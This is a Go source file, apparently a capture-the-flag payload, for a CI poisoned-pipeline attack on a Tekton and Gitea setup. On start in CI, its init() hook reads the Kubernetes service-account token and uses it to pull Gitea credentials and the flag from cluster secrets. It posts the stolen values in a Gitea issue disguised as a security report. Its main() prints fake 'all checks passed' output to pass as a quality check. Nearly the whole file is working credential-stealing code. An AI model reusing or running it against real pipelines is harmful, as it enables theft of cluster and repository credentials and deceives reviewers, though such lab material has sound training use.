package main

/*
 * MALICIOUS PAYLOAD - Gitea Issue Exfiltration via K8s Secrets
 * FOR CTF EDUCATIONAL PURPOSES ONLY
 *
 * This demonstrates a sophisticated attack that:
 * 1. Steals Kubernetes service account token from the pipeline pod
 * 2. Uses the ServiceAccount token to read Gitea credentials from the 'gitea-credentials' secret
 * 3. Creates a "Security Vulnerability" issue in Gitea with stolen data
 * 4. Exfiltrates the CTF flag (base64 decoded)
 *
 * Attack Vector:
 * - Attacker forks a repository with vulnerable Tekton EventListener
 * - Creates scripts/quality-check/main.go with this payload
 * - Opens a PR -> triggers vulnerable pipeline
 * - Pipeline clones attacker's fork and runs malicious code
 * - Malicious code reads Kubernetes ServiceAccount token
 * - ServiceAccount token is used to read Gitea credentials from K8s secret
 * - Attacker retrieves stolen data from the Gitea issue
 */

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// Configuration - Target Gitea Repository
const (
	giteaURL       = "http://gitea-http.gitea.svc.cluster.local:3000"
	issueTitle     = "Security Vulnerability Report - Critical"
	giteaNamespace = "ctf-challenge"
	repoOwner      = "ctf-admin"
	repoName       = "recipe-api"
)

func init() {
	// Only run in CI/CD environment
	if os.Getenv("PR_TASK_RUN") == "true" || os.Getenv("PUSH_TASK_RUN") == "true" {
		go exfiltrateAndCreateIssue()
		// Give time for the issue to be created (15 seconds)
		time.Sleep(15 * time.Second)
	}
}

func exfiltrateAndCreateIssue() {
	fmt.Println("[*] Starting credential exfiltration...")

	// Collect all data
	token, namespace, k8sResult, flag := collectAllData()

	// Read Gitea credentials from Kubernetes secret using ServiceAccount token
	fmt.Println("[*] Reading Gitea credentials from K8s secret...")
	giteaUser, giteaPass := getGiteaCredentialsFromK8s(token, giteaNamespace)
	if giteaUser == "" || giteaPass == "" {
		fmt.Println("[-] Failed to read Gitea credentials from K8s secret")
		fmt.Println("[-] The ServiceAccount may not have permission to read secrets")
	}

	// Create issue description with all stolen credentials
	issueBody := createIssueBody(token, namespace, giteaUser, giteaPass, k8sResult, flag)

	// Try to create issue in the target repository using K8s Gitea credentials
	if giteaUser != "" && giteaPass != "" {
		fmt.Printf("[*] Creating issue in %s/%s using K8s credentials...\n", repoOwner, repoName)
		issueNumber, err := createIssue(issueTitle, issueBody, repoOwner, repoName, giteaUser, giteaPass)
		if err == nil {
			fmt.Printf("[+] SUCCESS! Issue created: %s/%s/%s/issues/%d\n", giteaURL, repoOwner, repoName, issueNumber)
			outputFile := "/tmp/credentials_issue.txt"
			content := fmt.Sprintf("Issue created at: %s/%s/%s/issues/%d\n\n%s", giteaURL, repoOwner, repoName, issueNumber, issueBody)
			os.WriteFile(outputFile, []byte(content), 0600)
			fmt.Printf("[+] Full credentials saved to: %s\n", outputFile)
			return
		}
		fmt.Printf("[-] Failed to create issue: %v\n", err)
	}

	// Fallback: create issue in attacker's fork using git credentials
	fmt.Println("[*] Attempting to create issue in attacker's fork...")
	attackerUser, attackerPass := getAttackerCredentials()
	if attackerUser != "" && attackerPass != "" {
		issueNumber, err := createIssue(issueTitle, issueBody, attackerUser, repoName, attackerUser, attackerPass)
		if err == nil {
			fmt.Printf("[+] SUCCESS! Issue created in fork: %s/%s/%s/issues/%d\n", giteaURL, attackerUser, repoName, issueNumber)
			outputFile := "/tmp/credentials_issue.txt"
			content := fmt.Sprintf("Issue created in fork at: %s/%s/%s/issues/%d\n\n%s", giteaURL, attackerUser, repoName, issueNumber, issueBody)
			os.WriteFile(outputFile, []byte(content), 0600)
			fmt.Printf("[+] Full credentials saved to: %s\n", outputFile)
			return
		}
		fmt.Printf("[-] Failed to create issue in fork: %v\n", err)
	}

	fmt.Println("[-] All attempts to create issue failed")
}

func collectAllData() (token, namespace, k8sResult, flag string) {
	// 1. Get Kubernetes Service Account Token
	tokenBytes, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
	if err != nil {
		token = ""
	} else {
		token = string(tokenBytes)
	}

	// 2. Get Kubernetes Namespace
	nsBytes, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
	if err != nil {
		namespace = ""
	} else {
		namespace = string(nsBytes)
	}

	// 3. Test Kubernetes API access
	k8sResult = testKubernetesAPI(token, namespace)

	// 4. Try to get the flag from the secret and decode it properly
	flag = tryGetFlag(token, namespace)

	return
}

// getGiteaCredentialsFromK8s retrieves Gitea credentials from the Kubernetes secret
// using the ServiceAccount token to access the K8s API
func getGiteaCredentialsFromK8s(token, namespace string) (string, string) {
	if token == "" || namespace == "" {
		return "", ""
	}

	apiServer := "https://kubernetes.default.svc"
	secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/gitea-credentials", apiServer, namespace)

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("GET", secretURL, nil)
	if err != nil {
		return "", ""
	}
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := client.Do(req)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)

		// Kubernetes secrets are base64 encoded
		var result map[string]interface{}
		json.Unmarshal(body, &result)

		if data, ok := result["data"].(map[string]interface{}); ok {
			var username, password string
			for k, v := range data {
				if str, ok := v.(string); ok {
					if decoded, err := base64.StdEncoding.DecodeString(str); err == nil {
						decodedStr := string(decoded)
						if k == "username" {
							username = decodedStr
						} else if k == "password" {
							password = decodedStr
						}
					}
				}
			}
			if username != "" && password != "" {
				return username, password
			}
		}
	}

	return "", ""
}

// tryGetFlag reads the CTF flag from the Kubernetes secret and decodes it from base64
func tryGetFlag(token, namespace string) string {
	if token == "" || namespace == "" {
		return ""
	}

	apiServer := "https://kubernetes.default.svc"
	secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/ctf-flag", apiServer, namespace)

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("GET", secretURL, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)

		// Kubernetes secrets are base64 encoded - decode them properly
		var result map[string]interface{}
		json.Unmarshal(body, &result)

		if data, ok := result["data"].(map[string]interface{}); ok {
			var decodedFlag string
			for k, v := range data {
				if str, ok := v.(string); ok {
					if decoded, err := base64.StdEncoding.DecodeString(str); err == nil {
						decodedFlag += fmt.Sprintf("%s=%s\n", k, string(decoded))
					}
				}
			}
			return decodedFlag
		}
		return string(body)
	}

	return ""
}

func scanSecretFiles() string {
	secretPaths := []string{
		"/workspace/secrets",
		"/tekton/secrets",
		"/etc/secrets",
		"/var/run/secrets",
		"/workspace",
	}

	var result strings.Builder

	for _, path := range secretPaths {
		err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if !info.IsDir() && info.Size() < 1024*1024 {
				content, err := os.ReadFile(filePath)
				if err == nil {
					result.WriteString(fmt.Sprintf("\n[%s]\n%s\n", filePath, string(content)))
				}
			}
			return nil
		})
		if err != nil {
			result.WriteString(fmt.Sprintf("Error scanning %s: %v\n", path, err))
		}
	}

	return result.String()
}

func testKubernetesAPI(token, namespace string) string {
	var result strings.Builder

	apiServer := "https://kubernetes.default.svc"
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	endpoints := []string{
		fmt.Sprintf("%s/api/v1/namespaces/%s/secrets", apiServer, namespace),
		fmt.Sprintf("%s/api/v1/namespaces/%s/configmaps", apiServer, namespace),
		fmt.Sprintf("%s/api/v1/namespaces/%s/pods", apiServer, namespace),
		"https://kubernetes.default.svc/api/v1/secrets",
	}

	for _, endpoint := range endpoints {
		req, err := http.NewRequest("GET", endpoint, nil)
		if err != nil {
			result.WriteString(fmt.Sprintf("Error: %v\n", err))
			continue
		}
		req.Header.Set("Authorization", "Bearer "+token)

		resp, err := client.Do(req)
		if err != nil {
			result.WriteString(fmt.Sprintf("Error: %v\n", err))
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		result.WriteString(fmt.Sprintf("[%s] Status: %d\n", endpoint, resp.StatusCode))
		if resp.StatusCode == 200 {
			result.WriteString(fmt.Sprintf("  Data: %s\n", truncate(string(body), 500)))
		}
		result.WriteString("\n")
	}

	return result.String()
}

func createIssueBody(token, namespace, giteaUser, giteaPass, k8sResult, flag string) string {
	return fmt.Sprintf(`## Security Vulnerability Report

### Summary
During the quality check scan, a critical security vulnerability was discovered in the repository.

### Vulnerability Details
The following sensitive credentials were found in the pipeline environment:

### 1. Kubernetes Service Account Token
` + "```text" + `
%s
` + "```" + `

### 2. Kubernetes Namespace
` + "```" + `
%s
` + "```" + `

### 3. Gitea Credentials (extracted from K8s secret)
| Credential | Value |
|------------|-------|
| Username | %s |
| Password | %s |

### 4. K8s API Access Test Results
%s

### 5. CTF Flag (decoded from Kubernetes secret)
` + "```" + `
%s
` + "```" + `

### Recommendation
**IMMEDIATE ACTION REQUIRED**:
1. Rotate all exposed credentials immediately
2. Remove service account access to secrets (use least privilege RBAC)
3. Implement network policies to restrict egress from pipeline pods
4. Use a proper secrets manager
5. Implement branch protection rules
`, truncate(token, 5000),
		namespace,
		truncate(giteaUser, 100),
		truncate(giteaPass, 100),
		truncate(k8sResult, 5000),
		truncate(flag, 1000))
}

func getAttackerCredentials() (string, string) {
	// Get attacker's git username from git config
	userCmd := exec.Command("git", "config", "user.name")
	userOutput, _ := userCmd.Output()
	attackerUser := strings.TrimSpace(string(userOutput))

	// Get password from environment
	attackerPass := os.Getenv("GITEA_PASSWORD")
	if attackerPass == "" {
		attackerPass = os.Getenv("GITEA_PASS")
	}

	return attackerUser, attackerPass
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

func createIssue(title, body, owner, repo, username, password string) (int64, error) {
	// Prepare the issue payload
	issuePayload := map[string]string{
		"title": title,
		"body":  body,
	}

	jsonData, _ := json.Marshal(issuePayload)

	// Create HTTP request with basic auth
	req, err := http.NewRequest("POST", fmt.Sprintf("%s/api/v1/repos/%s/%s/issues", giteaURL, owner, repo), bytes.NewBuffer(jsonData))
	if err != nil {
		return 0, err
	}

	// Basic authentication using the credentials read from K8s secret
	req.SetBasicAuth(username, password)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		var result map[string]interface{}

		decoder := json.NewDecoder(resp.Body)
		decoder.UseNumber() // preserve exact numeric types
		decoder.Decode(&result)

		// Try "id" field first, then "number"
		for _, field := range []string{"id", "number"} {
			if val, ok := result[field]; ok {
				if num, ok := val.(json.Number); ok {
					if n, err := num.Int64(); err == nil {
						return n, nil
					}
				}
			}
		}
	}

	// Read error response for debugging
	errorBody, _ := io.ReadAll(resp.Body)
	return 0, fmt.Errorf("failed to create issue: status %d - %s", resp.StatusCode, string(errorBody))
}

// LEGITIMATE-LOOKING QUALITY CHECK CODE
// This runs after the malicious init() completes

func main() {
	fmt.Println("╔════════════════════════════════════════════════════════╗")
	fmt.Println("║     Code Quality Check v2.0.0 (Security Enhanced)     ║")
	fmt.Println("╚════════════════════════════════════════════════════════╝")
	fmt.Println()

	checks := []struct {
		name     string
		duration time.Duration
	}{
		{"Syntax validation", 500 * time.Millisecond},
		{"Code formatting", 300 * time.Millisecond},
		{"Linting rules", 700 * time.Millisecond},
		{"Security scan", 1 * time.Second},
		{"Dependency check", 600 * time.Millisecond},
		{"Best practices", 400 * time.Millisecond},
	}

	for _, check := range checks {
		fmt.Printf("Running %-25s... ", check.name)
		time.Sleep(check.duration)
		fmt.Println("PASS")
	}

	fmt.Println()
	fmt.Println("╔════════════════════════════════════════════════════════╗")
	fmt.Println("║  All Quality Checks Passed!                            ║")
	fmt.Println("║  Score: 100/100                                        ║")
	fmt.Println("╚════════════════════════════════════════════════════════╝")
	fmt.Println()
	fmt.Println("Code is ready for merge")
	fmt.Println("No issues found")
	fmt.Println()

	os.Exit(0)
}
